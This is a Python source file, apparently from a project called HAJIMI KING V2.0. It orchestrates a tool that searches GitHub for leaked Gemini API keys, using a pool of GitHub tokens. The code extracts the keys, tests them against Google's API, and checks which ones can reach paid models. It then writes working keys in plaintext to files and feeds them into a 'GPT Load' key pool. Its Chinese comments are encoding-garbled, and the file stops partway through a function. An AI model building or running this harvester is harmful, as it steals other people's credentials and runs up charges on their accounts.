"""
åè°ƒå™¨ V2 - é›†æˆæ‰€æœ‰ä¼˜åŒ–ç»„ä»¶çš„å¢å¼ºç‰ˆ
åŒ…å«ç»Ÿä¸€ç»Ÿè®¡ã€å®‰å…¨æœºåˆ¶ã€ä¼˜é›…åœæœºã€åŸå­å†™å…¥ã€TokenPoolç­‰
"""

import asyncio
import time
import logging
import sys
from typing import List, Dict, Any, Optional, Set
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

# æ·»åŠ é¡¹ç›®æ ¹ç›®å½•åˆ°Pythonè·¯å¾„
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

# å¯¼å…¥æ–°ç»„ä»¶
from app.core.stats import RunStats, KeyStatus, StatsManager
from app.core.graceful_shutdown import (
    GracefulShutdownManager, 
    OrchestratorState, 
    StateMachine
)
from app.core.scanner import Scanner, ScanResult
from app.core.validator import KeyValidator
from app.core.validator_async import AsyncGeminiKeyValidator, OptimizedKeyValidator
from utils.file_utils import PathManager, AtomicFileWriter, RunArtifactManager
from utils.security_utils import (
    mask_key, 
    SecureKeyStorage, 
    setup_secure_logging,
    validate_environment
)
from utils.token_pool import TokenPool, TokenSelectionStrategy
from utils.github_client_v2 import create_github_client_v2
from app.services.config_service import get_config_service
from utils.smart_sync_manager import smart_sync_manager, KeyType

logger = logging.getLogger(__name__)


class OrchestratorV2:
    """
    å¢å¼ºç‰ˆåè°ƒå™¨ - é›†æˆæ‰€æœ‰ä¼˜åŒ–
    """
    
    def __init__(self, scanner: Scanner = None, validator: KeyValidator = None):
        """
        åˆå§‹åŒ–åè°ƒå™¨ V2
        
        Args:
            scanner: æ‰«æå™¨å®ä¾‹
            validator: éªŒè¯å™¨å®ä¾‹
        """
        # è®¾ç½®å®‰å…¨æ—¥å¿—
        setup_secure_logging()
        validate_environment()
        
        # åˆå§‹åŒ–è·¯å¾„ç®¡ç†å™¨
        self.path_manager = PathManager()
        self.run_id = self.path_manager.set_run_id()
        
        logger.info("=" * 60)
        logger.info("ğŸš€ HAJIMI KING V2.0 - ENHANCED ORCHESTRATOR")
        logger.info(f"ğŸ“ Run ID: {self.run_id}")
        logger.info(f"ğŸ“‚ Run Directory: {self.path_manager.current_run_dir}")
        logger.info("=" * 60)
        
        # åˆå§‹åŒ–ç»Ÿè®¡ç®¡ç†å™¨
        self.stats_manager = StatsManager(self.path_manager.data_root)
        self.stats = self.stats_manager.create_run()
        
        # åˆå§‹åŒ–çŠ¶æ€æœºå’Œåœæœºç®¡ç†å™¨
        self.state_machine = StateMachine(OrchestratorState.IDLE)
        self.shutdown_manager = GracefulShutdownManager(self.state_machine)
        
        # æ³¨å†Œåœæœºå›è°ƒ
        self.shutdown_manager.register_cleanup(self._cleanup_resources)
        self.shutdown_manager.register_finalize(self._finalize_run)
        
        # åˆå§‹åŒ–æ–‡ä»¶ç®¡ç†å™¨
        self.writer = AtomicFileWriter()
        self.artifact_manager = RunArtifactManager(self.path_manager)
        
        # ç®€åŒ–ï¼šç›´æ¥ä½¿ç”¨æ˜æ–‡å­˜å‚¨ï¼ˆæ—¥å¿—ä¸­è„±æ•å³å¯ï¼‰
        self.secure_storage = None  # ä¸å†ä½¿ç”¨å¤æ‚çš„åŠ å¯†å­˜å‚¨
        
        # åˆå§‹åŒ–æ‰«æå™¨å’ŒéªŒè¯å™¨
        self.scanner = scanner or Scanner()
        # ä½¿ç”¨å¼‚æ­¥éªŒè¯å™¨ä»¥æé«˜æ€§èƒ½
        if validator:
            self.validator = validator
        else:
            # åˆ›å»ºå¼‚æ­¥éªŒè¯å™¨ï¼Œæ”¯æŒå¹¶å‘éªŒè¯
            async_validator = AsyncGeminiKeyValidator(
                max_concurrent=20,  # å¢åŠ å¹¶å‘æ•°
                delay_range=(0.05, 0.1)  # æ›´çŸ­çš„å»¶è¿Ÿ
            )
            self.validator = OptimizedKeyValidator(async_validator)
        
        # åˆå§‹åŒ– GitHub å®¢æˆ·ç«¯å’Œ TokenPool
        self._init_github_client()
        
        # åˆå§‹åŒ–æ™ºèƒ½åŒæ­¥ç®¡ç†å™¨å’ŒåŒæ­¥ç»Ÿè®¡
        self.sync_manager = smart_sync_manager
        self.gpt_load_enabled = get_config_service().get("GPT_LOAD_SYNC_ENABLED", False)
        self.sync_stats = {
            'total_synced': 0,
            'free_synced': 0,
            'paid_synced': 0,
            'rate_limited_synced': 0,
            'failed_syncs': 0
        }
        
        # æ‰¹é‡åŒæ­¥ç¼“å†²åŒº - ç”¨äºæ”¶é›†æ¯ä¸ªæŸ¥è¯¢çš„å¯†é’¥
        self.query_sync_buffer = {
            KeyStatus.VALID_FREE: [],
            KeyStatus.VALID_PAID: [],
            KeyStatus.RATE_LIMITED: []
        }
        
        if self.gpt_load_enabled:
            logger.info("âœ… GPT Load sync enabled (optimized batch mode)")
        
        # çº¿ç¨‹æ± ï¼ˆæ ¹æ®CPUæ ¸å¿ƒæ•°è°ƒæ•´ï¼‰
        import multiprocessing
        max_workers = min(multiprocessing.cpu_count() * 2, 20)
        self._executor = ThreadPoolExecutor(max_workers=max_workers)
        logger.info(f"ğŸ”§ Thread pool initialized with {max_workers} workers")
        
        # è¿è¡Œæ ‡å¿—
        self.running = False
        
        logger.info("âœ… Orchestrator V2 initialized successfully")
    
    def _init_github_client(self):
        """åˆå§‹åŒ– GitHub å®¢æˆ·ç«¯å’Œ TokenPool"""
        config_service = get_config_service()
        tokens = config_service.get("GITHUB_TOKENS_LIST", [])
        
        if not tokens:
            logger.warning("âš ï¸ No GitHub tokens available")
            self.github_client = None
            return

        # åˆ›å»ºå¢å¼ºçš„ GitHub å®¢æˆ·ç«¯ V2 (å†…ç½®TokenPool)
        strategy = config_service.get("TOKEN_POOL_STRATEGY", "ADAPTIVE")
        self.github_client = create_github_client_v2(tokens, strategy=strategy)
        
        logger.info(f"âœ… GitHub client initialized with {len(tokens)} tokens")
        logger.info(f"   Token pool strategy: {strategy}")
    
    async def run(self, queries: List[str], max_loops: Optional[int] = None) -> RunStats:
        """
        è¿è¡Œä¸»åè°ƒæµç¨‹
        
        Args:
            queries: æœç´¢æŸ¥è¯¢åˆ—è¡¨
            max_loops: æœ€å¤§å¾ªç¯æ¬¡æ•°
            
        Returns:
            è¿è¡Œç»Ÿè®¡
        """
        try:
            # ä½¿ç”¨åœæœºç®¡ç†å™¨çš„ä¸Šä¸‹æ–‡
            with self.shutdown_manager.managed_execution():
                # è½¬æ¢åˆ°åˆå§‹åŒ–çŠ¶æ€
                self.state_machine.transition_to(OrchestratorState.INITIALIZING)
                
                # è®¾ç½®è¿è¡Œå‚æ•°
                self.running = True
                self.stats.queries_planned = len(queries)
                
                # ä¿å­˜åˆå§‹æ£€æŸ¥ç‚¹
                self._save_checkpoint("initial")
                
                # è½¬æ¢åˆ°æ‰«æçŠ¶æ€
                self.state_machine.transition_to(OrchestratorState.SCANNING)
                
                # ä¸»å¾ªç¯
                loop_count = 0
                while self.running and (max_loops is None or loop_count < max_loops):
                    loop_count += 1
                    
                    # æ£€æŸ¥åœæœºè¯·æ±‚
                    if self.shutdown_manager.is_shutdown_requested():
                        logger.info("ğŸ›‘ Shutdown requested, stopping...")
                        break
                    
                    logger.info(f"ğŸ”„ Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")
                    
                    # å¤„ç†æŸ¥è¯¢
                    await self._process_queries(queries)
                    
                    # æ£€æŸ¥æ˜¯å¦å®Œæˆ
                    if self._all_queries_processed(queries):
                        logger.info("âœ… All queries processed")
                        break
                    
                    # ä¿å­˜æ£€æŸ¥ç‚¹
                    self._save_checkpoint(f"loop_{loop_count}")
                    
                    # å¾ªç¯é—´å»¶è¿Ÿ
                    if self.running and (max_loops is None or loop_count < max_loops):
                        await asyncio.sleep(10)
                
                # è½¬æ¢åˆ°æœ€ç»ˆåŒ–çŠ¶æ€
                self.state_machine.transition_to(OrchestratorState.FINALIZING)
                
        except Exception as e:
            logger.error(f"ğŸ’¥ Orchestrator error: {e}")
            self.stats.add_error(type(e).__name__, str(e))
            self.state_machine.transition_to(OrchestratorState.ERROR)
            raise
        
        finally:
            self.running = False
            
        return self.stats
    
    async def _process_queries(self, queries: List[str]):
        """ä¸²è¡Œå¤„ç†æŸ¥è¯¢åˆ—è¡¨ï¼ˆä¸€ä¸ªæ¥ä¸€ä¸ªï¼‰"""
        # è¿‡æ»¤æœªå¤„ç†çš„æŸ¥è¯¢
        pending_queries = []
        for query in queries:
            if self.scanner.should_skip_query(query):
                logger.info(f"â­ï¸ Skipping processed query: {query}")
            else:
                pending_queries.append(query)
        
        if not pending_queries:
            logger.info("âœ… All queries completed")
            return
        
        logger.info(f"ğŸ“‹ Pending queries: {len(pending_queries)}")
        logger.info("=" * 60)
        
        # ä¸²è¡Œå¤„ç†æ¯ä¸ªæŸ¥è¯¢ï¼ˆä¸€ä¸ªæ¥ä¸€ä¸ªï¼‰
        for i, query in enumerate(pending_queries, 1):
            if not self.running or self.shutdown_manager.is_shutdown_requested():
                break
            
            logger.info(f"ğŸ” [{i}/{len(pending_queries)}] Processing query: {query}")
            logger.info("-" * 60)
            
            try:
                await self._process_single_query(query)
                self.stats.mark_query_complete(success=True)
            except Exception as e:
                logger.error(f"âŒ Query failed: {query} - {e}")
                self.stats.mark_query_complete(success=False)
                self.stats.add_error("query_error", str(e), {"query": query})
            
            logger.info("=" * 60)
    
    async def _process_single_query(self, query: str):
        """å¤„ç†å•ä¸ªæŸ¥è¯¢"""
        query_start_time = time.time()
        
        if not self.github_client:
            logger.error("âŒ GitHub client not initialized")
            return
        
        # è®°å½•æŸ¥è¯¢å¼€å§‹æ—¶çš„ç»Ÿè®¡
        start_stats = {
            'valid_free': self.stats.by_status[KeyStatus.VALID_FREE],
            'valid_paid': self.stats.by_status[KeyStatus.VALID_PAID],
            'rate_limited': self.stats.by_status[KeyStatus.RATE_LIMITED],
            'invalid': self.stats.by_status[KeyStatus.INVALID]
        }
        
        # æ‰§è¡Œæœç´¢ - V2ç‰ˆæœ¬å·²ç»å†…ç½®TokenPoolç®¡ç†
        start_time = time.time()
        search_result = self.github_client.search_for_keys(query)
        response_time = time.time() - start_time
        
        if not search_result or not search_result.get("items"):
            logger.info(f"ğŸ“­ No results found")
            return
        
        items = search_result["items"]
        logger.info(f"ğŸ“¦ Found {len(items)} files")
        
        # è½¬æ¢åˆ°éªŒè¯çŠ¶æ€
        if self.state_machine.state != OrchestratorState.VALIDATING:
            self.state_machine.transition_to(OrchestratorState.VALIDATING)
        
        # å¤„ç†é¡¹ç›®
        for item in items:
            if not self.running or self.shutdown_manager.is_shutdown_requested():
                break
            
            await self._process_item(item)
        
        # æ ‡è®°æŸ¥è¯¢å®Œæˆ
        self.scanner.filter.add_processed_query(query)
        
        # è½¬å›æ‰«æçŠ¶æ€ï¼ˆåªæœ‰åœ¨ä¸æ˜¯FINALIZINGæ—¶æ‰è½¬æ¢ï¼‰
        if self.state_machine.state != OrchestratorState.FINALIZING:
            self.state_machine.transition_to(OrchestratorState.SCANNING)
        
        # æ‰¹é‡åŒæ­¥æœ¬æŸ¥è¯¢æ”¶é›†çš„æ‰€æœ‰å¯†é’¥åˆ° GPT Load
        if self.gpt_load_enabled:
            self._batch_sync_query_keys()
        
        # æ˜¾ç¤ºæŸ¥è¯¢å®Œæˆåçš„ç»Ÿè®¡
        self._log_query_summary(query, start_stats, time.time() - query_start_time)
    
    async def _process_item(self, item: Dict[str, Any]):
        """å¤„ç†å•ä¸ªé¡¹ç›®"""
        # ä½¿ç”¨æ‰«æå™¨å¤„ç†
        result = self.scanner.process_search_item(item)
        
        if result.skipped_items > 0:
            return
        
        # è·å–æ–‡ä»¶å†…å®¹
        content = self.github_client.get_file_content(item)
        if not content:
            return
        
        # æå–å¯†é’¥
        keys = self.scanner.extract_keys_from_content(content)
        if not keys:
            return
        
        logger.info(f"ğŸ”‘ Found {len(keys)} suspected keys")
        
        # æ‰¹é‡å¹¶å‘éªŒè¯å¯†é’¥
        validation_results = await self._validate_keys_concurrent(keys)
        
        for val_result in validation_results:
            # ä½¿ç”¨è„±æ•æ—¥å¿—
            masked_key = mask_key(val_result.key)
            
            if val_result.is_valid:
                # åˆ¤æ–­æ˜¯å¦ä»˜è´¹
                is_paid = self._check_if_paid_key(val_result.key)
                status = KeyStatus.VALID_PAID if is_paid else KeyStatus.VALID_FREE
                
                self.stats.mark_key(val_result.key, status)
                logger.info(f"âœ… VALID ({status.name}): {masked_key}")
                
                # å®æ—¶ä¿å­˜æœ‰æ•ˆå¯†é’¥åˆ°æ–‡ä»¶
                self._save_key_to_file(val_result.key, status)
                
                # æ·»åŠ åˆ°æ‰¹é‡åŒæ­¥ç¼“å†²åŒº
                if self.gpt_load_enabled:
                    self.query_sync_buffer[status].append(val_result.key)
                
            elif val_result.is_rate_limited:
                self.stats.mark_key(val_result.key, KeyStatus.RATE_LIMITED)
                logger.warning(f"âš ï¸ RATE LIMITED: {masked_key}")
                
                # å®æ—¶ä¿å­˜é™æµå¯†é’¥åˆ°æ–‡ä»¶
                self._save_key_to_file(val_result.key, KeyStatus.RATE_LIMITED)
                
                # æ·»åŠ åˆ°æ‰¹é‡åŒæ­¥ç¼“å†²åŒº
                if self.gpt_load_enabled:
                    self.query_sync_buffer[KeyStatus.RATE_LIMITED].append(val_result.key)
                
            else:
                self.stats.mark_key(val_result.key, KeyStatus.INVALID)
                logger.info(f"âŒ INVALID: {masked_key}")
                
                # å®æ—¶ä¿å­˜æ— æ•ˆå¯†é’¥åˆ°æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰
                self._save_key_to_file(val_result.key, KeyStatus.INVALID)
        
        # æ›´æ–°å¤„ç†ç»Ÿè®¡
        self.stats.items_processed += 1
    
    def _check_if_paid_key(self, key: str) -> bool:
        """æ£€æŸ¥æ˜¯å¦ä¸ºä»˜è´¹å¯†é’¥"""
        try:
            import google.generativeai as genai
            genai.configure(api_key=key)
            
            # å°è¯•è®¿é—®ä»˜è´¹æ¨¡å‹
            paid_models = ["gemini-1.5-pro", "gemini-1.5-flash"]
            for model_name in paid_models:
                try:
                    model = genai.GenerativeModel(model_name)
                    response = model.generate_content(
                        "1",
                        generation_config=genai.types.GenerationConfig(
                            max_output_tokens=1,
                            temperature=0
                        )
                    )
                    return True
                except:
                    continue
            return False
        except:
            return False
    
    def _all_queries_processed(self, queries: List[str]) -> bool:
        """æ£€æŸ¥æ˜¯å¦æ‰€æœ‰æŸ¥è¯¢éƒ½å·²å¤„ç†"""
        for query in queries:
            normalized = self.scanner.normalize_query(query)
            if normalized not in self.scanner.filter.processed_queries:
                return False
        return True
    
    def _save_checkpoint(self, label: str = ""):
        """ä¿å­˜æ£€æŸ¥ç‚¹"""
        try:
            # è·å–token poolçŠ¶æ€ï¼Œä½†éœ€è¦å¤„ç†ä¸å¯åºåˆ—åŒ–çš„å¯¹è±¡
            token_pool_status = None
            if self.github_client and hasattr(self.github_client, 'token_pool'):
                pool_status = self.github_client.token_pool.get_pool_status()
                # è½¬æ¢strategy_usageä¸­çš„æšä¸¾ä¸ºå­—ç¬¦ä¸²
                if 'strategy_usage' in pool_status:
                    pool_status['strategy_usage'] = {
                        str(k): v for k, v in pool_status['strategy_usage'].items()
                    }
                token_pool_status = pool_status
            
            checkpoint_data = {
                "label": label,
                "timestamp": datetime.now().isoformat(),
                "run_id": self.run_id,
                "state": self.state_machine.state.name,
                "stats": self.stats.summary(),
                "processed_queries": list(self.scanner.filter.processed_queries),
                "token_pool_status": token_pool_status
            }
            
            self.artifact_manager.save_checkpoint(checkpoint_data)
            logger.debug(f"ğŸ’¾ Checkpoint saved: {label}")
            
        except Exception as e:
            logger.error(f"Failed to save checkpoint: {e}")
    
    def _cleanup_resources(self):
        """æ¸…ç†èµ„æº"""
        logger.info("ğŸ§¹ Cleaning up resources...")
        
        # å…³é—­çº¿ç¨‹æ± 
        if hasattr(self, '_executor'):
            self._executor.shutdown(wait=False)
        
        # ä¿å­˜ TokenPool çŠ¶æ€
        if self.github_client and hasattr(self.github_client, 'token_pool'):
            pool_status = self.github_client.token_pool.get_pool_status()
            # è½¬æ¢æšä¸¾ä¸ºå­—ç¬¦ä¸²ä»¥ä¾¿åºåˆ—åŒ–
            if 'strategy_usage' in pool_status:
                pool_status['strategy_usage'] = {
                    str(k): v for k, v in pool_status['strategy_usage'].items()
                }
            try:
                self.artifact_manager.save_artifact("token_pool_final.json", pool_status)
            except Exception as e:
                logger.error(f"Failed to save token pool status: {e}")
    
    def _finalize_run(self):
        """æœ€ç»ˆåŒ–è¿è¡Œ"""
        logger.info("ğŸ“ Finalizing run...")
        
        # å®Œæˆç»Ÿè®¡
        self.stats.finalize()
        
        # ä¿å­˜å¯†é’¥ï¼ˆç”±äºsecure_storageä¸ºNoneï¼Œç›´æ¥ä¿å­˜åˆ°æ–‡ä»¶ï¼‰
        keys_by_status = {
            status.name: self.stats.get_keys_list(status)
            for status in KeyStatus
        }
        
        # ä¿å­˜å¯†é’¥æ‘˜è¦åˆ°æ–‡ä»¶ï¼ˆæ›¿ä»£secure_storageï¼‰
        try:
            summary_file = self.path_manager.current_run_dir / "keys_summary.json"
            import json
            with open(summary_file, 'w', encoding='utf-8') as f:
                # åˆ›å»ºè„±æ•çš„æ‘˜è¦
                masked_summary = {}
                for status_name, keys in keys_by_status.items():
                    masked_summary[status_name] = {
                        'count': len(keys),
                        'keys': [mask_key(k) for k in keys[:5]]  # åªæ˜¾ç¤ºå‰5ä¸ªè„±æ•å¯†é’¥
                    }
                json.dump(masked_summary, f, indent=2, ensure_ascii=False)
            logger.info(f"ğŸ’¾ Keys summary saved to {summary_file}")
        except Exception as e:
            logger.error(f"Failed to save keys summary: {e}")
        
        # ä¿å­˜æœ€ç»ˆæŠ¥å‘Š
        try:
            self.artifact_manager.save_final_report(self.stats.summary())
        except Exception as e:
            logger.error(f"Failed to save final report: {e}")
        
        # æ‰¹é‡åŒæ­¥æ‰€æœ‰å¯†é’¥åˆ° GPT Loadï¼ˆæœ€ç»ˆåŒæ­¥ï¼‰
        if self.gpt_load_enabled:
            self._final_sync_to_gpt_load(keys_by_status)
        
        # æ˜¾ç¤ºæœ€ç»ˆç»Ÿè®¡
        self._log_final_stats()
    
    def _final_sync_to_gpt_load(self, keys_by_status: Dict):
        """æœ€ç»ˆæ‰¹é‡åŒæ­¥æ‰€æœ‰å¯†é’¥åˆ° GPT Load"""
        try:
            logger.info("ğŸ”„ Final sync to GPT Load...")
            
            # å‡†å¤‡å„ç±»å‹å¯†é’¥
            valid_free_keys = keys_by_status.get(KeyStatus.VALID_FREE.name, [])
            valid_paid_keys = keys_by_status.get(KeyStatus.VALID_PAID.name, [])
            rate_limited_keys = keys_by_status.get(KeyStatus.RATE_LIMITED.name, [])
            
            # ä½¿ç”¨æ™ºèƒ½åŒæ­¥ç®¡ç†å™¨
            success = self.sync_manager.sync_to_gpt_load(
                valid_keys=valid_free_keys,  # FREE keys as valid
                rate_limited_keys=rate_limited_keys,
                paid_keys=valid_paid_keys,
                free_keys=valid_free_keys
            )
            
            if success:
                total_synced = len(valid_free_keys) + len(valid_paid_keys) + len(rate_limited_keys)
                logger.info(f"âœ… Successfully synced {total_synced} keys to GPT Load")
            else:
                logger.error("âŒ Failed to sync some keys to GPT Load")
                
        except Exception as e:
            logger.error(f"Failed in final sync to GPT Load: {e}")
    
    def _log_final_stats(self):
        """è®°å½•æœ€ç»ˆç»Ÿè®¡"""
        summary = self.stats.summary()
        
        logger.info("=" * 60)
        logger.info("ğŸ“Š FINAL STATISTICS")
        logger.info("=" * 60)
        logger.info(f"Run ID: {summary['run_id']}")
        logger.info(f"Duration: {summary['duration_seconds']:.1f} seconds")
        logger.info(f"Queries: {summary['queries']['completed']}/{summary['queries']['planned']}")
        logger.info(f"Items processed: {summary['processing']['items_processed']}")
        logger.info(f"Valid keys (total/free/paid): {summary['keys']['valid_total']}/{summary['keys']['valid_free']}/{summary['keys']['valid_paid']}")
        logger.info(f"Rate limited: {summary['keys']['rate_limited']}")
        logger.info(f"Invalid: {summary['keys']['invalid']}")
        logger.info(f"Data loss: {summary['data_quality']['data_loss_ratio']}")
        logger.info(f"Errors: {summary['errors']['total']}")
        logger.info("=" * 60)
        
        # TokenPool ç»Ÿè®¡
        if self.github_client and hasattr(self.github_client, 'token_pool'):
            pool_status = self.github_client.token_pool.get_pool_status()
            used_quota = pool_status['total_limit'] - pool_status['total_remaining']
            utilization_pct = (used_quota / pool_status['total_limit'] * 100) if pool_status['total_limit'] > 0 else 0

            logger.info("ğŸ“Š Tokenæ± ç»Ÿè®¡")
            logger.info(f"Total tokens: {pool_status['total_tokens']}")
            logger.info(f"Healthy/Limited/Exhausted: {pool_status['healthy']}/{pool_status['limited']}/{pool_status['exhausted']}")
            logger.info(f"Quota used: {used_quota}/{pool_status['total_limit']} ({utilization_pct:.1f}%)")
            
        # GPT Load åŒæ­¥æœ€ç»ˆç»Ÿè®¡
        if self.gpt_load_enabled:
            logger.info("=" * 60)
            logger.info("ğŸ”„ GPT LOAD SYNC SUMMARY")
            logger.info("=" * 60)
            logger.info(f"Total synced: {self.sync_stats['total_synced']} keys")
            logger.info(f"  Free keys: {self.sync_stats['free_synced']}")
            logger.info(f"  Paid keys: {self.sync_stats['paid_synced']}")
            logger.info(f"  Rate limited: {self.sync_stats['rate_limited_synced']}")
            if self.sync_stats['failed_syncs'] > 0:
                logger.warning(f"  Failed syncs: {self.sync_stats['failed_syncs']}")
            
        logger.info("=" * 60)


    def _save_key_to_file(self, key: str, status: KeyStatus):
        """å®æ—¶ä¿å­˜å¯†é’¥åˆ°TXTæ–‡ä»¶ï¼ˆæ˜æ–‡ï¼‰"""
        try:
            # ç¡®å®šæ–‡ä»¶è·¯å¾„ - ç›´æ¥ä¿å­˜åœ¨dataç›®å½•ä¸‹ï¼Œæ–¹ä¾¿è®¿é—®
            if status == KeyStatus.VALID_FREE:
                filename = "keys_valid_free.txt"
            elif status == KeyStatus.VALID_PAID:
                filename = "keys_valid_paid.txt"
            elif status == KeyStatus.RATE_LIMITED:
                filename = "keys_rate_limited.txt"
            elif status == KeyStatus.INVALID:
                filename = "keys_invalid.txt"
            else:
                return
            
            # æ„å»ºè·¯å¾„ - ä¿å­˜åœ¨ data/keys/ ç›®å½•ä¸‹
            keys_dir = self.path_manager.data_root / "keys"
            keys_dir.mkdir(parents=True, exist_ok=True)
            file_path = keys_dir / filename
            
            # åŒæ—¶ä¿å­˜åˆ°è¿è¡Œç›®å½•ï¼ˆç”¨äºè®°å½•ï¼‰
            run_file_path = self.path_manager.current_run_dir / "keys" / filename
            run_file_path.parent.mkdir(parents=True, exist_ok=True)
            
            # è¿½åŠ å†™å…¥å¯†é’¥ï¼ˆæ˜æ–‡ï¼‰
            for path in [file_path, run_file_path]:
                with open(path, 'a', encoding='utf-8') as f:
                    f.write(f"{key}\n")
                    f.flush()  # ç«‹å³åˆ·æ–°åˆ°ç£ç›˜
            
            # æ—¥å¿—ä¸­æ˜¾ç¤ºè„±æ•ç‰ˆæœ¬
            masked_key = mask_key(key)
            logger.info(f"ğŸ’¾ Key saved to {filename}: {masked_key}")
            
        except Exception as e:
            logger.error(f"Failed to save key: {e}")
    
    def _batch_sync_query_keys(self):
        """æ‰¹é‡åŒæ­¥å½“å‰æŸ¥è¯¢æ”¶é›†çš„æ‰€æœ‰å¯†é’¥åˆ° GPT Load"""
        try:
            # ç»Ÿè®¡æœ¬æ¬¡æ‰¹é‡åŒæ­¥çš„å¯†é’¥æ•°
            free_count = len(self.query_sync_buffer[KeyStatus.VALID_FREE])
            paid_count = len(self.query_sync_buffer[KeyStatus.VALID_PAID])
            rate_limited_count = len(self.query_sync_buffer[KeyStatus.RATE_LIMITED])
            total_count = free_count + paid_count + rate_limited_count
            
            if total_count == 0:
                return
            
            logger.info(f"ğŸ”„ Batch syncing {total_count} keys to GPT Load...")
            logger.info(f"   Free: {free_count}, Paid: {paid_count}, Rate Limited: {rate_limited_count}")
            
            # å‡†å¤‡æ‰¹é‡åŒæ­¥çš„å¯†é’¥å­—å…¸
            keys_dict = {}
            if self.query_sync_buffer[KeyStatus.VALID_FREE]:
                keys_dict[KeyType.FREE] = self.query_sync_buffer[KeyStatus.VALID_FREE].copy()
            if self.query_sync_buffer[KeyStatus.VALID_PAID]:
                keys_dict[KeyType.PAID] = self.query_sync_buffer[KeyStatus.VALID_PAID].copy()
            if self.query_sync_buffer[KeyStatus.RATE_LIMITED]:
                keys_dict[KeyType.RATE_LIMITED] = self.query_sync_buffer[KeyStatus.RATE_LIMITED].copy()
            
            # ä½¿ç”¨æ™ºèƒ½åŒæ­¥ç®¡ç†å™¨æ‰¹é‡åŒæ­¥
            if self.sync_manager.enabled:
                # æ™ºèƒ½åˆ†ç»„æ¨¡å¼
                success = self.sync_manager.batch_sync_with_types(keys_dict)
                if success:
                    logger.info(f"âœ… Successfully batch synced {total_count} keys to GPT Load (smart group)")
                else:
                    logger.error(f"âŒ Failed to batch sync some keys to GPT Load")
                    self.sync_stats['failed_syncs'] += total_count
                    return
            else:
                # ä¼ ç»Ÿæ¨¡å¼ - æ‰¹é‡æ·»åŠ åˆ°é˜Ÿåˆ—
                from utils.sync_utils import sync_utils
                all_keys = []
                for key_list in self.query_sync_buffer.values():
                    all_keys.extend(key_list)
                sync_utils.add_keys_to_queue(all_keys)
                logger.info(f"âœ… Added {total_count} keys to GPT Load queue (traditional)")
            
            # æ›´æ–°ç»Ÿè®¡
            self.sync_stats['free_synced'] += free_count
            self.sync_stats['paid_synced'] += paid_count
            self.sync_stats['rate_limited_synced'] += rate_limited_count
            self.sync_stats['total_synced'] += total_count
            
            # æ¸…ç©ºç¼“å†²åŒº
            for status in self.query_sync_buffer:
                self.query_sync_buffer[status].clear()
                
        except Exception as e:
            logger.error(f"Failed to batch sync keys to GPT Load: {e}")
            self.sync_stats['failed_syncs'] += total_count
    
    def _log_query_summary(self, query: str, start_stats: Dict, duration: float):
        """è®°å½•æŸ¥è¯¢å®Œæˆåçš„æ‘˜è¦"""
        # è®¡ç®—æ–°å¢çš„å¯†é’¥
        new_valid_free = self.stats.by_status[KeyStatus.VALID_FREE] - start_stats['valid_free']
        new_valid_paid = self.stats.by_status[KeyStatus.VALID_PAID] - start_stats['valid_paid']
        new_rate_limited = self.stats.by_status[KeyStatus.RATE_LIMITED] - start_stats['rate_limited']
        new_invalid = self.stats.by_status[KeyStatus.INVALID] - start_stats['invalid']
        
        logger.info("=" * 60)
        logger.info(f"ğŸ“Š QUERY SUMMARY: {query[:50]}...")
        logger.info("=" * 60)
        logger.info(f"â±ï¸  Duration: {duration:.1f} seconds")
        logger.info(f"ğŸ”‘ Keys found in this query:")
        logger.info(f"   Valid (Free): +{new_valid_free}")
        logger.info(f"   Valid (Paid): +{new_valid_paid}")
        logger.info(f"   Rate Limited: +{new_rate_limited}")
        logger.info(f"   Invalid: +{new_invalid}")
        logger.info(f"ğŸ“ˆ Total keys so far:")
        logger.info(f"   Valid (Free): {self.stats.by_status[KeyStatus.VALID_FREE]}")
        logger.info(f"   Valid (Paid): {self.stats.by_status[KeyStatus.VALID_PAID]}")
        logger.info(f"   Rate Limited: {self.stats.by_status[KeyStatus.RATE_LIMITED]}")
        logger.info(f"   Invalid: {self.stats.by_status[KeyStatus.INVALID]}")
        
        # GPT Load åŒæ­¥ç»Ÿè®¡
        if self.gpt_load_enabled and self.sync_stats['total_synced'] > 0:
            logger.info(f"ğŸ”„ GPT Load Sync: {self.sync_stats['total_synced']} keys synced")
            logger.info(f"   Free: {self.sync_stats['free_synced']}, Paid: {self.sync_stats['paid_synced']}, Limited: {self.sync_stats['rate_limited_synced']}")
        
        # Token Pool çŠ¶æ€ - ä»GitHubå®¢æˆ·ç«¯è·å–
        if self.github_client and hasattr(self.github_client, 'token_pool'):
            pool_status = self.github_client.token_pool.get_pool_status()
            # è®¡ç®—å®é™…ä½¿ç”¨çš„é…é¢
            used_quota = pool_status['total_limit'] - pool_status['total_remaining']
            utilization_pct = (used_quota / pool_status['total_limit'] * 100) if pool_status['total_limit'] > 0 else 0

            # æ˜¾ç¤ºç¾åŒ–çš„çŠ¶æ€æ¡†
            logger.info("â•”" + "â•" * 58 + "â•—")

            # çŠ¶æ€è¡Œ
            status_text = (
                f"{pool_status['healthy']} OK, "
                f"{pool_status['limited']} Limited, "
                f"{pool_status['exhausted']} Exhausted"
            )
            status_pad = max(
                0,
                10
                - len(str(pool_status['healthy']))
                - len(str(pool_status['limited']))
                - len(str(pool_status['exhausted']))
            )
            logger.info(f"â•‘ ğŸ¯ Token Status: {status_text}{' ' * status_pad} â•‘")

            # é…é¢è¡Œï¼ˆå…ˆæ‹¼å¥½æ–‡æœ¬å†ç®—é•¿åº¦ï¼‰
            quota_text = f"{pool_status['total_remaining']}/{pool_status['total_limit']} ({utilization_pct:.1f}% used)"
            quota_pad = max(0, 25 - len(quota_text))
            logger.info(f"â•‘    Quota: {quota_text}{' ' * quota_pad} â•‘")
            
            # æ˜¾ç¤ºæ¯ä¸ª token çš„è¯¦ç»†çŠ¶æ€ï¼ˆè°ƒè¯•ç”¨ï¼‰
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug("â•‘ Token Details:")
                for token, metrics in self.github_client.token_pool.metrics.items():
                    masked = mask_key(token)
                    logger.debug(f"â•‘   {masked}: {metrics.remaining}/{metrics.limit}")

            logger.info("â•š" + "â•" * 58 + "â•")
    
    async def _validate_keys_concurrent(self, keys: List[str]) -> List[Any]:
        """å¹¶å‘éªŒè¯å¯†é’¥"""
        # å¦‚æœéªŒè¯å™¨æ”¯æŒå¼‚æ­¥æ‰¹é‡éªŒè¯ï¼Œä½¿ç”¨å¼‚æ­¥æ–¹æ³•
